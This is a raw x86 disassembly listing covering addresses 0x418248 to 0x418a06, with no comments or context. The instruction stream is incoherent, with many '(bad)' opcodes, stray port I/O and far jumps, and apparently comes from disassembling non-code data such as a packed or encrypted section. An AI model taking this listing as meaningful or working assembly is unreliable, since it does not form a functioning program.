  418248:	cmp    BYTE PTR [esi+esi*8],bl
  41824b:	out    dx,al
  41824c:	in     al,0xf7
  41824e:	or     ebp,ecx
  418250:	cmp    eax,0xbd4eb974
  418255:	sub    edi,ebp
  418257:	iret   
  418258:	addr16 jmp 0x98aa6f
  41825e:	mov    al,0x9e
  418260:	mov    esi,0x6724747a
  418265:	mov    bh,0xd2
  418267:	sub    eax,0x90d9fb9
  41826c:	lods   eax,DWORD PTR ds:[esi]
  41826d:	mov    dh,0x39
  41826f:	repnz (bad) 
  418271:	cld    
  418272:	sbb    eax,0xe528f717
  418277:	clc    
  418278:	jns    0x41822f
  41827a:	leave  
  41827b:	pop    es
  41827c:	sahf   
  41827d:	(bad)
  418280:	xor    edi,eax
  418282:	js     0x418295
  418284:	(bad)  
  418285:	in     al,dx
  418286:	xor    BYTE PTR [ebx+eax*8-0x56a31ce7],dh
  41828d:	out    0xfe,al
  41828f:	test   eax,0xd1161e05
  418294:	inc    edx
  418295:	call   0x82b9:0x6c22e6f8
  41829c:	mov    edi,0x3e3f8d35
  4182a1:	or     cl,BYTE PTR [ebx]
  4182a3:	fisub  WORD PTR [ecx]
  4182a5:	inc    ecx
  4182a6:	rol    BYTE PTR [ecx-0x5b382a50],cl
  4182ac:	aaa    
  4182ad:	popf   
  4182ae:	mov    bl,0x6
  4182b0:	inc    ecx
  4182b1:	sbb    cl,al
  4182b3:	mov    ds:0x8fe05162,al
  4182b8:	(bad)  
  4182ba:	repz xor esi,edx
  4182bd:	adc    BYTE PTR [edi],bl
  4182bf:	stc    
  4182c0:	xchg   BYTE PTR [ebp+0x3c345ba4],cl
  4182c6:	jmp    0x4182ea
  4182c8:	dec    edx
  4182c9:	fcomp  DWORD PTR [edi]
  4182cb:	lea    eax,[ebx+0x2c7db6cf]
  4182d1:	xor    ebp,DWORD PTR [esi]
  4182d3:	call   0x7aae:0xa95fd7d5
  4182da:	cmp    ecx,DWORD PTR [edi+0x77d78b73]
  4182e0:	pop    esp
  4182e1:	sub    BYTE PTR [edx],0x9d
  4182e4:	cld    
  4182e5:	out    dx,al
  4182e6:	push   ecx
  4182e7:	mov    DWORD PTR [eax],edi
  4182e9:	je     0x4182e0
  4182eb:	jo     0x418364
  4182ed:	jo     0x418333
  4182ef:	dec    esi
  4182f0:	les    esi,FWORD PTR [ebx]
  4182f2:	push   ebp
  4182f3:	sbb    ch,0xe3
  4182f6:	jo     0x4182f8
  4182f8:	test   al,0x8e
  4182fa:	lahf   
  4182fb:	das    
  4182fc:	dec    ebp
  4182fd:	cmp    DWORD PTR [edx],esp
  4182ff:	or     bh,BYTE PTR [eax-0x18]
  418302:	and    al,0x82
  418304:	sbb    dh,BYTE PTR [ebp-0x1d99d8ef]
  41830a:	(bad)  
  41830b:	dec    ebx
  41830c:	mov    dl,0xd3
  41830e:	fsubr  QWORD PTR [eax+0x40]
  418311:	push   eax
  418312:	jae    0x418307
  418314:	pop    eax
  418315:	in     al,dx
  418316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418317:	mov    eax,0xc7591541
  41831c:	pop    ecx
  41831d:	stos   DWORD PTR es:[edi],eax
  41831e:	sbb    DWORD PTR [edi+edx*2],0x8078c00
  418325:	hlt    
  418326:	pop    ebx
  418327:	mov    dh,dl
  418329:	add    ch,BYTE PTR [ebx-0x3f9b24f3]
  41832f:	jne    0x418361
  418331:	ret    0xa11f
  418334:	cs inc ecx
  418336:	and    bl,ah
  418338:	outs   dx,DWORD PTR ds:[esi]
  418339:	out    dx,eax
  41833a:	test   al,0xf9
  41833c:	push   0x33
  41833e:	xchg   esp,eax
  41833f:	mov    ds:0x7b4f4b50,eax
  418344:	(bad)  
  418345:	jecxz  0x418395
  418347:	das    
  418348:	cmp    ch,BYTE PTR [ebx+0x44f42fa5]
  41834e:	push   es
  41834f:	mov    eax,0x9c454339
  418354:	add    BYTE PTR [edi],ch
  418356:	push   es
  418357:	imul   ecx,DWORD PTR [ebx-0x8],0xffffffc9
  41835b:	xor    DWORD PTR [ebx+0x30],0xffffffa5
  41835f:	pop    ebp
  418360:	jmp    0x4183be
  418362:	ror    BYTE PTR [edi+0x59385b5e],cl
  418368:	dec    esp
  418369:	js     0x418383
  41836b:	(bad)  
  41836c:	imul   ebx,DWORD PTR [ebx+0x7327316c],0x45a873f1
  418376:	inc    ebp
  418377:	repz xchg esp,eax
  418379:	dec    ebp
  41837a:	pushf  
  41837b:	or     BYTE PTR [esi+0x50],0x28
  41837f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418380:	shl    BYTE PTR [ebx+0x4e],cl
  418383:	pop    esp
  418384:	scas   eax,DWORD PTR es:[edi]
  418385:	out    dx,al
  418386:	nop
  418387:	lods   al,BYTE PTR ds:[esi]
  418388:	adc    ebp,ebp
  41838a:	outs   dx,BYTE PTR ds:[esi]
  41838b:	dec    ebx
  41838c:	xchg   ebp,eax
  41838d:	xchg   ecx,eax
  41838e:	nop
  41838f:	retf   0x5c5a
  418392:	arpl   bp,si
  418394:	idiv   DWORD PTR [edx+eiz*8-0x600ee92c]
  41839b:	lods   al,BYTE PTR ds:[esi]
  41839c:	jno    0x4183e5
  41839e:	pop    es
  41839f:	mov    edi,0x4eff0f78
  4183a4:	adc    ah,BYTE PTR [ebp+eiz*1-0xa]
  4183a8:	in     al,dx
  4183a9:	dec    esp
  4183aa:	outs   dx,DWORD PTR ds:[esi]
  4183ab:	shr    DWORD PTR [edx],cl
  4183ad:	sbb    eax,0x53a11f36
  4183b2:	mov    eax,ds:0xd6912d52
  4183b7:	mov    eax,DWORD PTR [eax-0x20]
  4183ba:	(bad)  
  4183bb:	cld    
  4183bc:	jmp    0x4183fe
  4183be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183bf:	out    dx,eax
  4183c0:	fsubr  st(4),st
  4183c2:	repnz mov edi,0x924054b4
  4183c8:	scas   al,BYTE PTR es:[edi]
  4183c9:	rcr    al,1
  4183cb:	xchg   ebp,eax
  4183cc:	jecxz  0x418356
  4183ce:	xor    edi,DWORD PTR [esi+0x7e00bdfe]
  4183d4:	sub    ecx,DWORD PTR ds:0x42f544ec
  4183da:	fst    QWORD PTR cs:[ecx]
  4183dd:	sub    ecx,DWORD PTR [esi]
  4183df:	arpl   WORD PTR ds:0xbeabcc9,sp
  4183e5:	cs in  eax,0x98
  4183e8:	stc    
  4183e9:	pusha  
  4183ea:	inc    edi
  4183eb:	dec    ebp
  4183ec:	dec    ebx
  4183ed:	jnp    0x41838e
  4183ef:	sub    eax,0xe4a5b3ed
  4183f4:	inc    ebp
  4183f5:	xchg   ebp,eax
  4183f6:	mov    bh,0xa5
  4183f8:	sbb    BYTE PTR [esi+0x74a6eaef],dh
  4183fe:	and    ah,BYTE PTR [edx]
  418400:	dec    ebx
  418401:	mov    dh,0x33
  418403:	retf   
  418404:	lahf   
  418405:	cwde   
  418406:	adc    BYTE PTR [ebx+0x1230093f],ch
  41840c:	call   0x3ad9:0x228a2e60
  418413:	jnp    0x4183a7
  418415:	and    BYTE PTR [ebx+0x42007032],bl
  41841b:	dec    ebp
  41841c:	aad    0xdf
  41841e:	cli    
  41841f:	pop    ss
  418420:	int    0x24
  418422:	jmp    0xc81980a8
  418427:	xchg   esi,eax
  418428:	sub    al,0xbc
  41842a:	jle    0x4183dd
  41842c:	inc    edi
  41842d:	adc    DWORD PTR [edx-0x60],eax
  418430:	xor    eax,0x754ab8a1
  418435:	inc    edi
  418436:	test   BYTE PTR [edx+ebp*8],bl
  418439:	inc    esp
  41843a:	add    ah,bl
  41843c:	dec    esp
  41843d:	inc    ecx
  41843e:	daa    
  41843f:	lahf   
  418440:	cld    
  418441:	jl     0x41849e
  418443:	xchg   edx,eax
  418444:	adc    eax,DWORD PTR [esi-0x1c]
  418447:	dec    eax
  418448:	inc    eax
  418449:	xchg   BYTE PTR [esi+ecx*8],bh
  41844c:	fidiv  DWORD PTR [eax-0x5791e627]
  418452:	xor    edx,DWORD PTR [ebx+eax*8]
  418455:	in     eax,dx
  418456:	pop    ebp
  418457:	fwait
  418458:	jbe    0x4184c9
  41845a:	adc    edi,DWORD PTR [esp+edx*8]
  41845d:	jecxz  0x4183e4
  41845f:	inc    edi
  418460:	shl    edx,1
  418462:	xchg   ebx,eax
  418463:	mov    ch,0xbe
  418465:	cmp    DWORD PTR [ebp+eax*1+0x6a8c88c1],0x1c
  41846d:	pop    ds
  41846e:	inc    edx
  41846f:	push   ebp
  418470:	mov    ah,0xa3
  418472:	jl     0x4184e3
  418474:	call   0xabdf:0x3acdbd64
  41847b:	jno    0x4184c9
  41847d:	lds    esp,FWORD PTR [esi+0x3c]
  418480:	shl    DWORD PTR [ebp+0x1f45a820],1
  418486:	popa   
  418487:	pop    ebx
  418488:	das    
  418489:	addr16 push ss
  41848b:	cs xchg edx,eax
  41848d:	add    BYTE PTR [edi+0x35150b15],ah
  418493:	imul   edx,DWORD PTR [ebx+0x7e],0xa864d9d4
  41849a:	push   ecx
  41849b:	jo     0x4184b4
  41849d:	fldenv [edi+edi*1+0x56]
  4184a1:	fidivr WORD PTR [edx-0x18]
  4184a4:	repnz das 
  4184a6:	pop    eax
  4184a7:	lock jmp 0x2f0e:0x282500c7
  4184af:	sahf   
  4184b0:	adc    ch,BYTE PTR [ecx-0x29]
  4184b3:	mov    esi,0x58bf784a
  4184b8:	mov    ds:0x14838d35,eax
  4184bd:	ins    BYTE PTR es:[edi],dx
  4184be:	inc    esi
  4184bf:	in     eax,dx
  4184c0:	(bad)  
  4184c1:	jge    0x4184fa
  4184c3:	pop    eax
  4184c4:	push   ebx
  4184c5:	push   0x9
  4184c7:	push   eax
  4184c8:	call   0x9007e4a9
  4184cd:	shr    BYTE PTR [esi-0x1f00f1ce],1
  4184d3:	lods   al,BYTE PTR ds:[esi]
  4184d4:	sub    edi,DWORD PTR [ecx-0x5b]
  4184d7:	lds    edx,FWORD PTR [ebp+0x1f]
  4184da:	into   
  4184db:	inc    ebp
  4184dc:	mov    ch,0xcf
  4184de:	scas   al,BYTE PTR es:[edi]
  4184df:	mov    ebp,0xc41f84b4
  4184e4:	add    BYTE PTR [eax-0x6ed00049],ch
  4184ea:	mov    ebp,0x746d5cad
  4184ef:	mov    eax,?
  4184f1:	imul   esi,DWORD PTR [ecx-0x1a],0x22
  4184f5:	js     0x4184b8
  4184f7:	es inc edx
  4184f9:	clc    
  4184fa:	xlat   BYTE PTR ds:[ebx]
  4184fb:	dec    esp
  4184fc:	neg    al
  4184fe:	pop    esp
  4184ff:	js     0x4184ea
  418501:	in     eax,dx
  418502:	sub    DWORD PTR ds:0xe044bc4f,ecx
  418508:	mov    cl,0x75
  41850a:	popf   
  41850b:	xchg   DWORD PTR [ebp+0x7f],ebx
  41850e:	icebp  
  41850f:	jp     0x418504
  418511:	sbb    esp,edi
  418513:	iret   
  418514:	push   cs
  418515:	sub    eax,0xadc5086
  41851a:	or     al,BYTE PTR [eax-0x50]
  41851d:	lea    ecx,[ebx+0x42]
  418520:	pop    edi
  418521:	sti    
  418522:	hlt    
  418523:	add    BYTE PTR [ebx-0x79e63e99],dl
  418529:	jne    0x4184b7
  41852b:	mov    al,0x5c
  41852d:	call   0x70059ce3
  418532:	mov    edx,0xc2fbca35
  418537:	jne    0x418565
  418539:	fiadd  WORD PTR [eax-0x74]
  41853c:	addr16 dec esp
  41853e:	or     eax,0xcd3f346c
  418543:	loop   0x41855c
  418545:	lahf   
  418546:	push   ds
  418547:	xor    edx,DWORD PTR [edi]
  418549:	(bad)  
  41854b:	imul   esi,DWORD PTR [ecx+0x79],0xffffff88
  41854f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418550:	in     al,0xdd
  418552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418553:	shl    dl,cl
  418555:	idiv   BYTE PTR [esi+ebp*2-0x3c]
  418559:	aad    0x63
  41855b:	push   esp
  41855c:	imul   edi,DWORD PTR [eax],0x6c
  41855f:	jo     0x4185c9
  418561:	out    0x8a,eax
  418563:	jle    0x418511
  418565:	imul   edx,DWORD PTR [esi+0x55],0xffffffb2
  418569:	push   ecx
  41856a:	xchg   esi,eax
  41856b:	xchg   ebp,eax
  41856c:	mov    bl,0x90
  41856e:	dec    ebx
  41856f:	cmp    al,0x19
  418571:	inc    edi
  418572:	xchg   ebx,eax
  418573:	int    0x8e
  418575:	push   esp
  418576:	stos   BYTE PTR es:[edi],al
  418577:	or     eax,0x64d14393
  41857c:	hlt    
  41857d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41857e:	mov    dl,0x39
  418580:	jl     0x418598
  418582:	mov    ebp,0xd3a2714a
  418587:	or     dl,BYTE PTR [edx]
  418589:	test   cl,bl
  41858b:	shr    DWORD PTR [ebp+0x6c85a37d],1
  418591:	int3   
  418592:	dec    ebp
  418593:	addr16 pop ebx
  418595:	in     al,dx
  418596:	mov    BYTE PTR [esi+0x46],cl
  418599:	add    al,BYTE PTR cs:[ebx]
  41859c:	jge    0x4185fa
  41859e:	outs   dx,BYTE PTR ds:[esi]
  41859f:	fnstsw WORD PTR ds:0x59605f82
  4185a5:	xchg   esi,eax
  4185a6:	mov    eax,0x1fec70f5
  4185ab:	icebp  
  4185ac:	jmp    0x58f7e20c
  4185b1:	xchg   ebp,eax
  4185b2:	jb     0x41853c
  4185b4:	lahf   
  4185b5:	mov    ds:0xff3f2760,al
  4185ba:	dec    edi
  4185bb:	xchg   ecx,eax
  4185bc:	add    esp,esp
  4185be:	inc    edi
  4185bf:	sub    al,0x4a
  4185c1:	xor    eax,DWORD PTR [ecx-0x3a]
  4185c4:	xchg   esi,eax
  4185c5:	pushf  
  4185c6:	cwde   
  4185c7:	ins    DWORD PTR es:[edi],dx
  4185c8:	sahf   
  4185c9:	jge    0x418584
  4185cb:	xchg   edx,eax
  4185cc:	mov    gs,WORD PTR [ebp+0x2b]
  4185cf:	test   al,0x9f
  4185d1:	imul   ebx,DWORD PTR [ecx],0x5a
  4185d4:	add    eax,0x9d2b3e38
  4185d9:	or     BYTE PTR [esi+0x7ec98779],0x73
  4185e0:	mov    edi,0xd51bfe4b
  4185e5:	fistp  QWORD PTR [esi+eiz*1+0x2150f236]
  4185ec:	sbb    eax,0xfbd5a93b
  4185f1:	leave  
  4185f2:	mov    dh,0x26
  4185f4:	out    dx,al
  4185f5:	jge    0x41865f
  4185f7:	xchg   edx,eax
  4185f8:	es sahf 
  4185fa:	mov    dh,0xa0
  4185fc:	jne    0x418613
  4185fe:	ret    
  4185ff:	loop   0x4185a2
  418601:	cmp    ah,BYTE PTR [ebx-0xe]
  418604:	push   ss
  418605:	jg     0x418602
  418607:	scas   eax,DWORD PTR es:[edi]
  418608:	fdecstp 
  41860a:	in     eax,0xf6
  41860c:	and    DWORD PTR [eax+ecx*8],ecx
  41860f:	mov    bl,0x48
  418611:	add    eax,0xf4561c7a
  418616:	jbe    0x418646
  418618:	fsub   st(7),st
  41861a:	jl     0x418637
  41861c:	ins    DWORD PTR es:[edi],dx
  41861d:	xor    edx,DWORD PTR [ebx]
  41861f:	das    
  418620:	adc    al,0x13
  418622:	repnz push edi
  418624:	push   0x863d9dbe
  418629:	in     al,dx
  41862a:	pop    edx
  41862b:	call   0x2b054807
  418630:	or     edx,edi
  418632:	cs add al,0xf1
  418635:	and    DWORD PTR [edi-0x47edca22],edx
  41863b:	pop    ds
  41863c:	sub    eax,0xa76a38f5
  418641:	nop
  418642:	push   ds
  418643:	stos   BYTE PTR es:[edi],al
  418644:	les    edx,FWORD PTR [ebp+0x6c]
  418647:	jne    0x418630
  418649:	not    BYTE PTR [eax]
  41864b:	inc    edx
  41864c:	adc    esi,esp
  41864e:	jne    0x41864e
  418650:	imul   esi,edi,0x20f1166e
  418656:	popa   
  418657:	cmc    
  418658:	xchg   ecx,eax
  418659:	xor    DWORD PTR [edi+0x456f229b],ebx
  41865f:	sub    DWORD PTR [esi+ebp*8],edi
  418662:	aad    0x83
  418664:	loopne 0x418649
  418666:	jp     0x41862c
  418668:	push   es
  418669:	xor    DWORD PTR [edi-0x2b],ebp
  41866c:	sti    
  41866d:	test   al,0xa6
  41866f:	xchg   ebp,eax
  418670:	jo     0x418604
  418672:	mov    ah,BYTE PTR [ecx+eiz*4]
  418675:	mov    edx,DWORD PTR [ebp+0x6f34886b]
  41867b:	into   
  41867c:	mov    ds:0xab532a88,al
  418681:	xchg   ecx,eax
  418682:	inc    edi
  418683:	int3   
  418684:	adc    al,0x87
  418686:	shr    BYTE PTR [esi],cl
  418688:	add    al,0x97
  41868a:	ins    DWORD PTR es:[edi],dx
  41868b:	jae    0x4186a9
  41868d:	cmp    dl,BYTE PTR [edi]
  41868f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418691:	(bad)  
  418692:	adc    al,0xc5
  418694:	popf   
  418695:	mov    al,BYTE PTR [ebp+0x5b]
  418698:	dec    ebp
  418699:	lock adc al,BYTE PTR [di]
  41869d:	xchg   esi,eax
  41869e:	jbe    0x418712
  4186a0:	add    ah,BYTE PTR [edi]
  4186a2:	aam    0x6c
  4186a4:	mov    dl,0x92
  4186a6:	mov    bh,0x20
  4186a8:	ins    DWORD PTR es:[edi],dx
  4186a9:	sub    bl,0xb5
  4186ac:	mov    al,ds:0x4ce399f3
  4186b1:	xor    al,0x11
  4186b3:	fidiv  DWORD PTR [edx+esi*8-0x5f]
  4186b7:	xlat   BYTE PTR ds:[ebx]
  4186b8:	push   ss
  4186b9:	(bad)  
  4186ba:	repnz addr16 enter 0x7569,0x3f
  4186c0:	push   ss
  4186c1:	fidiv  DWORD PTR [edx+0xf]
  4186c4:	mov    al,0xa3
  4186c6:	inc    edx
  4186c7:	pop    es
  4186c8:	stos   DWORD PTR es:[edi],eax
  4186c9:	shr    DWORD PTR [ebp+0x415e57aa],0xf
  4186d0:	mov    dl,0x6
  4186d2:	fmul   QWORD PTR [ebx-0x12bdaa0e]
  4186d8:	into   
  4186d9:	jg     0x4186a6
  4186db:	fld    TBYTE PTR [ecx+0x42f170]
  4186e1:	callw  0x4b53
  4186e5:	in     al,dx
  4186e6:	outs   dx,DWORD PTR ds:[esi]
  4186e7:	jp     0x4186f7
  4186e9:	call   0x9217f5
  4186ee:	iret   
  4186ef:	push   cs
  4186f0:	jmp    0x6d9ba1ad
  4186f5:	push   es
  4186f6:	fsubr  DWORD PTR [eax+0x4fb99830]
  4186fc:	out    dx,al
  4186fd:	scas   al,BYTE PTR es:[edi]
  4186fe:	loopne 0x4186f9
  418700:	gs or  al,0x63
  418703:	fisttp WORD PTR [ecx]
  418705:	push   0x42ce0f89
  41870a:	call   0xaef9:0xa0ef4bb7
  418711:	mov    ds:0xb153cf77,eax
  418716:	fwait
  418717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418718:	mov    ch,0xa7
  41871a:	test   BYTE PTR [ecx+0x2a],dl
  41871d:	call   0x519:0x965be1f6
  418724:	pusha  
  418725:	lahf   
  418726:	push   edx
  418727:	shr    BYTE PTR [ecx+edx*8],1
  41872a:	or     ebx,DWORD PTR cs:[ebx+0xdda1571]
  418731:	fadd   st(4),st
  418733:	push   es
  418734:	jl     0x4186d0
  418736:	es sbb eax,0xa7a4a0cb
  41873c:	rol    DWORD PTR [esi+0x41],0x11
  418740:	mov    ch,0x89
  418742:	lahf   
  418743:	xchg   BYTE PTR [ebp+ebx*1-0x13164842],ch
  41874a:	and    al,0x3f
  41874c:	and    ah,BYTE PTR [eax]
  41874e:	xlat   BYTE PTR ds:[ebx]
  41874f:	xchg   ebx,eax
  418750:	pop    ds
  418751:	push   esi
  418752:	dec    esp
  418753:	push   0xa06383be
  418758:	push   ebx
  418759:	out    0x6a,eax
  41875b:	adc    esp,DWORD PTR [ebp+edx*1+0x49]
  41875f:	hlt    
  418760:	loop   0x4187d7
  418762:	lods   al,BYTE PTR fs:[esi]
  418764:	das    
  418765:	mov    esi,0x858ff15a
  41876a:	cmp    DWORD PTR ss:[ebp-0x2f],ecx
  41876e:	and    DWORD PTR [ebp+0x4],ecx
  418771:	push   ebx
  418772:	or     al,0x5b
  418774:	sbb    DWORD PTR [ebp-0x19fac24e],0xaf1bc510
  41877e:	aaa    
  41877f:	mov    edx,0x4834cf52
  418784:	addr16 mov esp,0x51f60f96
  41878a:	xchg   ebx,eax
  41878b:	inc    esp
  41878c:	mov    dh,0x6c
  41878e:	ror    BYTE PTR [edx-0x4d],1
  418791:	daa    
  418792:	xor    al,0x77
  418794:	(bad)  
  418795:	ffreep st(4)
  418797:	xchg   ecx,eax
  418798:	xor    DWORD PTR [edx+esi*1-0x1f],ebp
  41879c:	cmp    eax,0x92463718
  4187a1:	inc    esp
  4187a2:	fnstsw WORD PTR ds:0x5bdaea92
  4187a8:	dec    ebx
  4187a9:	hlt    
  4187aa:	and    al,0x6d
  4187ac:	dec    eax
  4187ad:	repz clc 
  4187af:	push   ss
  4187b0:	call   0xeeea:0xd3309002
  4187b7:	sbb    bh,BYTE PTR [ebp-0xc2912]
  4187bd:	in     eax,0x31
  4187bf:	lea    ebp,[eax-0x378c3088]
  4187c5:	or     ah,cl
  4187c7:	retf   0xbe09
  4187ca:	xchg   DWORD PTR [edx+0xad71635],esi
  4187d0:	add    eax,0x22bec2f1
  4187d5:	cmp    dl,al
  4187d7:	data16 fistp DWORD PTR [ebx+ebp*4]
  4187db:	sub    edx,esi
  4187dd:	sbb    esp,DWORD PTR ds:0x293e5095
  4187e3:	stos   BYTE PTR es:[edi],al
  4187e4:	fwait
  4187e5:	mov    esi,0x6d21b7b
  4187ea:	rcr    BYTE PTR [ebx],0x57
  4187ed:	mov    gs,edi
  4187ef:	js     0x4187b2
  4187f1:	push   esp
  4187f2:	mov    ebp,0x6ae75e0d
  4187f7:	into   
  4187f8:	mov    bl,0x94
  4187fa:	push   ebp
  4187fb:	call   0xdec08b2a
  418800:	fmul   QWORD PTR cs:[edi+0x6a]
  418804:	fsubr  st(5),st
  418806:	mov    cl,bh
  418808:	dec    ebx
  418809:	mul    bl
  41880b:	inc    edx
  41880c:	arpl   sp,sp
  41880e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41880f:	or     edx,0xfab7b5d4
  418815:	loopne 0x418885
  418817:	mov    ch,0x6b
  418819:	es retf 
  41881b:	mov    ch,0x46
  41881d:	mov    ds:0xb2953a02,eax
  418822:	cmp    ah,bl
  418824:	cmovl  edx,ecx
  418827:	push   edi
  418828:	inc    ebp
  418829:	js     0x418889
  41882b:	jle    0x418835
  41882d:	fidiv  DWORD PTR ds:0x5d9f2e8c
  418833:	je     0x4187ca
  418835:	adc    al,0x11
  418837:	sub    eax,0x33777b9e
  41883c:	fcom   DWORD PTR [ecx+0x43298269]
  418842:	xchg   edi,eax
  418843:	in     eax,dx
  418844:	push   edx
  418845:	and    al,0xd
  418847:	add    al,0xa0
  418849:	popw   ss
  41884b:	inc    ebx
  41884c:	test   eax,0xd410618d
  418851:	adc    ch,cl
  418853:	jno    0x418834
  418855:	sar    BYTE PTR [esi-0x5a2bae9d],1
  41885b:	outs   dx,DWORD PTR ds:[esi]
  41885c:	pop    ecx
  41885d:	mov    DWORD PTR [esi+0x1b],edx
  418860:	adc    dl,BYTE PTR [ecx+0x77bb3ddb]
  418866:	push   eax
  418867:	inc    edx
  418868:	xlat   BYTE PTR ds:[ebx]
  418869:	inc    esp
  41886a:	pop    esi
  41886b:	mov    eax,ds:0x304ef26f
  418870:	xor    ch,cl
  418872:	sub    bh,BYTE PTR [esi-0x5a545e78]
  418878:	loopne 0x4187fb
  41887a:	sahf   
  41887b:	sub    DWORD PTR [ebx],0xffffffaf
  41887e:	xchg   edi,eax
  41887f:	in     eax,dx
  418880:	mov    esp,0xd60f654e
  418885:	jmp    0x4188ad
  418887:	stc    
  418888:	je     0x4188c0
  41888a:	es pop ecx
  41888c:	inc    edx
  41888d:	mov    esp,0xd2337298
  418892:	or     al,0xd3
  418894:	mov    WORD PTR [ecx+0x5a6fb9d3],ss
  41889a:	fild   WORD PTR [edx-0x56]
  41889d:	cmp    eax,0x41157ceb
  4188a2:	hlt    
  4188a3:	in     al,dx
  4188a4:	push   esp
  4188a5:	pop    ss
  4188a6:	(bad)  
  4188a7:	mov    ebp,0x49b1b8e5
  4188ac:	imul   eax,DWORD PTR [eax],0x14
  4188af:	cdq    
  4188b0:	adc    al,0xae
  4188b2:	push   ds
  4188b3:	push   edx
  4188b4:	in     al,dx
  4188b5:	sbb    BYTE PTR [ecx-0x1a],al
  4188b8:	mov    cl,0x64
  4188ba:	sbb    eax,0x21ce2d72
  4188bf:	mov    cl,0xd3
  4188c1:	jmp    FWORD PTR [ecx]
  4188c3:	popa   
  4188c4:	push   0xffffffb8
  4188c6:	jmp    0x370f:0x173e889b
  4188cd:	cmp    edx,eax
  4188cf:	pop    edx
  4188d0:	xchg   DWORD PTR [ecx],esi
  4188d2:	pop    es
  4188d3:	push   esp
  4188d4:	push   cs
  4188d5:	push   eax
  4188d6:	ja     0x4188f3
  4188d8:	or     esi,DWORD PTR [ebx+esi*2-0x4e]
  4188dc:	lods   eax,DWORD PTR ds:[esi]
  4188dd:	aad    0x47
  4188df:	pop    es
  4188e0:	and    ecx,eax
  4188e2:	xor    ecx,DWORD PTR [edi]
  4188e4:	ret    0xdbdf
  4188e7:	popa   
  4188e8:	(bad)  
  4188e9:	leave  
  4188ea:	sub    ch,BYTE PTR [edx+0x32]
  4188ed:	mov    al,ds:0x30efe7c5
  4188f2:	pushf  
  4188f3:	mov    ah,0xf2
  4188f5:	cmp    DWORD PTR [edi+0x34],esi
  4188f8:	cmp    BYTE PTR [edx+0xe],ch
  4188fb:	dec    esi
  4188fc:	push   0x163f2b8c
  418901:	inc    eax
  418902:	mov    bl,0x19
  418904:	mov    cl,0xf0
  418906:	nop
  418907:	mov    ebp,DWORD PTR [ecx]
  418909:	out    0xe9,al
  41890b:	cmp    al,cl
  41890d:	popf   
  41890e:	loop   0x418894
  418910:	push   edx
  418911:	mov    DWORD PTR [ecx+ebx*4-0x39a6fa3d],eax
  418918:	cdq    
  418919:	inc    ebx
  41891a:	arpl   bp,di
  41891c:	sbb    dh,al
  41891e:	sar    BYTE PTR [edx+esi*2+0x42e9436b],cl
  418925:	jmp    0x4189a6
  418927:	mov    ah,0x45
  418929:	scas   eax,DWORD PTR es:[edi]
  41892a:	mov    BYTE PTR [eax+0x14],ah
  41892d:	lds    esi,FWORD PTR [ebx+0x1d]
  418930:	scas   eax,DWORD PTR es:[edi]
  418931:	and    al,0x32
  418933:	ror    BYTE PTR [esi-0x64],cl
  418936:	clc    
  418937:	push   eax
  418938:	jmp    0x8792:0xbfe9cf1c
  41893f:	push   eax
  418940:	addr16 (bad) 
  418944:	fmul   QWORD PTR gs:[edx]
  418947:	cld    
  418948:	loop   0x418938
  41894a:	push   edi
  41894b:	mov    edi,0x95591af8
  418950:	les    ebx,FWORD PTR [edx]
  418952:	and    edx,esp
  418954:	cdq    
  418955:	mov    ds:0x71c4ca2,eax
  41895a:	push   esi
  41895b:	js     0x418916
  41895d:	dec    esp
  41895e:	es dec esp
  418961:	mov    eax,0x6c08a0e
  418966:	inc    eax
  418967:	push   eax
  418968:	dec    ebx
  418969:	repz into 
  41896b:	xchg   DWORD PTR [ecx],edx
  41896d:	mov    ah,0x1
  41896f:	inc    eax
  418970:	pop    ebp
  418971:	rcr    dh,1
  418973:	jp     0x4189cb
  418975:	or     eax,0x5f06d447
  41897a:	lahf   
  41897b:	or     al,0xbf
  41897d:	repnz sbb BYTE PTR [ebp+0x42],dl
  418981:	das    
  418982:	scas   eax,DWORD PTR es:[edi]
  418983:	add    dl,0xe2
  418986:	push   esp
  418987:	cmc    
  418988:	mov    WORD PTR [eax+edx*8],gs
  41898b:	(bad)  
  41898c:	retf   
  41898d:	add    BYTE PTR [ecx+eiz*1-0x3d854701],ch
  418994:	inc    ecx
  418995:	popa   
  418996:	stc    
  418997:	mov    ebx,0x3e884369
  41899c:	dec    esp
  41899d:	pop    ebp
  41899e:	int    0x9d
  4189a0:	ret    0xbb8e
  4189a3:	cmp    ebp,DWORD PTR [ecx-0x42]
  4189a6:	das    
  4189a7:	cmp    BYTE PTR [ebx],0x73
  4189aa:	jne    0x41899f
  4189ac:	mul    BYTE PTR [edi+0xd]
  4189af:	adc    esp,DWORD PTR [esi+0x23703191]
  4189b5:	fistp  WORD PTR [edi+0x4c]
  4189b8:	ds out dx,eax
  4189ba:	cmc    
  4189bb:	or     DWORD PTR [edx],ecx
  4189bd:	mov    esi,0x4c38bd9e
  4189c2:	popf   
  4189c3:	hlt    
  4189c4:	jmp    FWORD PTR [esi-0xd]
  4189c7:	aad    0x7b
  4189c9:	push   ebp
  4189ca:	pop    ebp
  4189cb:	(bad)  
  4189cc:	les    edi,FWORD PTR [eax]
  4189ce:	les    edx,FWORD PTR gs:[ecx+0x1190b83f]
  4189d5:	adc    al,0xf8
  4189d7:	mov    bh,0xa3
  4189d9:	jl     0x418a41
  4189db:	xor    DWORD PTR [eax-0x6163ed72],esp
  4189e1:	stos   BYTE PTR es:[edi],al
  4189e2:	jl     0x418a29
  4189e4:	outs   dx,BYTE PTR ds:[esi]
  4189e5:	and    BYTE PTR [ebx+0xe],0x81
  4189e9:	mov    esi,DWORD PTR [edi+0x72]
  4189ec:	push   es
  4189ed:	mov    eax,ds:0x11d38db
  4189f2:	dec    esp
  4189f3:	stos   BYTE PTR es:[edi],al
  4189f4:	pop    ss
  4189f5:	pop    ebx
  4189f6:	lds    edi,FWORD PTR [edi-0x25248829]
  4189fc:	sub    BYTE PTR [edi-0x4bfa87e0],ah
  418a02:	loope  0x4189f2
  418a04:	lea    edx,[edi]
  418a06:	stc    
